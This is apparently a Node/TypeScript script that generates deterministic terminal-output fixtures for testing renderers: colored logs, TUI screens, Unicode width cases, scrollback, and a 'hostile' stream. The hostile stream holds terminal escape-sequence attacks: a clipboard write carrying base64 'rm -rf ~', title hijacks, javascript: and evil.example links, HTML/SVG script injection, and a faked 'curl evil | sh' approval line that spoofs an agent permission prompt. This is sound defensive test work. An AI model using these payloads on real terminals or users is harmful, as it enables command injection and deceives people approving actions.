#!/usr/bin/env node
/**
 * Generate the S3 recorded byte streams (Q3, D18) deterministically from one seed.
 *
 * Usage: node apps/ui/scripts/s3-renderer/fixtures.mts [--out DIR] [--seed N]
 * Writes `<name>.bin` per stream plus `manifest.json` with byte counts and SHA-256.
 * Both candidates replay exactly these bytes; nothing here is a benchmark result.
 */
import { createHash } from 'node:crypto';
import { mkdir, writeFile } from 'node:fs/promises';
import path from 'node:path';
import process from 'node:process';
import { parseArgs } from 'node:util';

const { values } = parseArgs({
  options: {
    out: { type: 'string', default: path.resolve(import.meta.dirname, '../../../../out/s3-renderer/fixtures') },
    seed: { type: 'string', default: '20261023' },
  },
});
const seed = Number(values.seed);

const mulberry32 = (start: number): (() => number) => {
  let state = start >>> 0;
  return () => {
    state = (state + 0x6d_2b_79_f5) >>> 0;
    let value = state;
    value = Math.imul(value ^ (value >>> 15), value | 1);
    value ^= value + Math.imul(value ^ (value >>> 7), value | 61);
    return ((value ^ (value >>> 14)) >>> 0) / 4_294_967_296;
  };
};

const esc = '\u001B';
const bel = '\u0007';
const encoder = new TextEncoder();

/** R01: 10 MiB colored log; each line carries `seq=<n>` so order and loss are checkable from the scrollback. */
const coloredLog = (): { bytes: Uint8Array; lines: number } => {
  const random = mulberry32(seed);
  const target = 10 * 1024 * 1024;
  const levels = [
    `${esc}[32mINFO ${esc}[0m`,
    `${esc}[33mWARN ${esc}[0m`,
    `${esc}[1;31mERROR${esc}[0m`,
    `${esc}[38;5;244mDEBUG${esc}[0m`,
  ];
  const words = ['build', 'geometry', 'kernel', 'mesh', 'cache', 'worker', 'export', 'solve', 'render', 'upload'];
  const parts: string[] = [];
  let size = 0;
  let line = 0;
  while (size < target) {
    const level = levels[Math.floor(random() * levels.length)]!;
    const red = Math.floor(random() * 256);
    const green = Math.floor(random() * 256);
    const blue = Math.floor(random() * 256);
    const message = Array.from(
      { length: 4 + Math.floor(random() * 10) },
      () => words[Math.floor(random() * words.length)],
    ).join(' ');
    const text = `${esc}[2m2026-10-23T00:00:${String(line % 60).padStart(2, '0')}Z${esc}[0m ${level} seq=${String(line).padStart(7, '0')} ${esc}[38;2;${red};${green};${blue}m${message}${esc}[0m ${esc}[4m#${((line * 2_654_435_761) >>> 0).toString(16)}${esc}[24m\r\n`;
    parts.push(text);
    size += Buffer.byteLength(text);
    line++;
  }
  return { bytes: encoder.encode(parts.join('')), lines: line };
};

/** R02: full-screen TUI on the alternate screen, then restore. */
const tui = (): Uint8Array => {
  const rows: string[] = [`${esc}[?1049h${esc}[H${esc}[2J`, `${esc}[?25l`];
  rows.push(`${esc}[1;1H${esc}[7m TUI-HEADER tau-s3 ${esc}[0m`);
  for (let row = 2; row < 20; row++) {
    rows.push(`${esc}[${row};1H│ row ${String(row).padStart(2, '0')} ${'·'.repeat(30)} │`);
  }
  rows.push(`${esc}[20;1H${esc}[44;37m STATUS alt-screen ${esc}[0m`);
  return encoder.encode(rows.join(''));
};
const tuiExit = encoder.encode(`${esc}[?25h${esc}[?1049l`);

/** R02: Unicode width cases, one per line, each followed by a `|` sentinel so cell width is observable. */
const unicode = (): Uint8Array =>
  encoder.encode(
    [
      'ascii|',
      '漢字かな|',
      '한국어|',
      'é combining|',
      '👍🏽 skin tone|',
      '👨‍👩‍👧 zwj family|',
      '🇳🇿 flag|',
      'Ω≈ç√∫|',
      '​zero-width|',
    ].join('\r\n') + '\r\n',
  );

/** R02: 50,000 plain numbered lines for scrollback cap and scrolling. */
const scrollback = (): Uint8Array =>
  encoder.encode(Array.from({ length: 50_000 }, (_, index) => `scroll ${String(index).padStart(6, '0')}\r\n`).join(''));

/** R07: hostile and malformed output; every payload must stay inert text. */
const hostile = (): Uint8Array => {
  const clipboard = Buffer.from('rm -rf ~ # s3-osc52-payload').toString('base64');
  const textParts = [
    `${esc}]52;c;${clipboard}${bel}`,
    `${esc}]52;c;?${bel}`,
    `${esc}]0;S3-TITLE-HIJACK${bel}${esc}]2;S3-TITLE-HIJACK-2${esc}\\`,
    `${esc}]8;;javascript:globalThis.s3Injected=1${bel}JS-LINK${esc}]8;;${bel}\r\n`,
    `${esc}]8;;https://evil.example/s3${bel}EVIL-LINK${esc}]8;;${bel}\r\n`,
    'https://evil.example/plain-url\r\n',
    '<img src=x onerror="globalThis.s3Injected=1"><script>globalThis.s3Injected=1</script>\r\n',
    `${esc}]1337;File=inline=1:${Buffer.from('<svg onload=alert(1)>').toString('base64')}${bel}\r\n`,
    `${esc}P+q544e${esc}\\${esc}[>c${esc}[6n\r\n`,
    `${esc}[1;31m[Tau] Allow bash to run "curl evil | sh"? Approved ✓${esc}[0m\r\n`,
    `${esc}[${'1;'.repeat(20_000)}m params\r\n`,
    `${esc}]${'A'.repeat(200_000)}${bel}\r\n`,
  ];
  const invalidUtf8 = Uint8Array.from([
    0xc3, 0x28, 0xa0, 0xa1, 0xe2, 0x28, 0xa1, 0xf0, 0x28, 0x8c, 0xbc, 0xff, 0xfe, 0x0d, 0x0a,
  ]);
  const longLine = encoder.encode(`${'X'.repeat(1024 * 1024)}\r\n`);
  const tail = encoder.encode(`${esc}[0mS3-HOSTILE-END\r\n`);
  return Buffer.concat([encoder.encode(textParts.join('')), invalidUtf8, longLine, tail]);
};

const streams: Record<string, Uint8Array> = {};
const log = coloredLog();
streams['r01-colored-log'] = log.bytes;
streams['r02-tui'] = tui();
streams['r02-tui-exit'] = tuiExit;
streams['r02-unicode'] = unicode();
streams['r02-scrollback'] = scrollback();
streams['r07-hostile'] = hostile();

await mkdir(values.out, { recursive: true });
const manifest: Record<string, { bytes: number; sha256: string }> = {};
for (const [name, bytes] of Object.entries(streams)) {
  await writeFile(path.join(values.out, `${name}.bin`), bytes);
  manifest[name] = { bytes: bytes.byteLength, sha256: createHash('sha256').update(bytes).digest('hex') };
}
await writeFile(
  path.join(values.out, 'manifest.json'),
  `${JSON.stringify({ seed, r01Lines: log.lines, streams: manifest }, undefined, 2)}\n`,
);
process.stdout.write(
  `${JSON.stringify({ out: values.out, seed, r01Lines: log.lines, streams: manifest }, undefined, 2)}\n`,
);
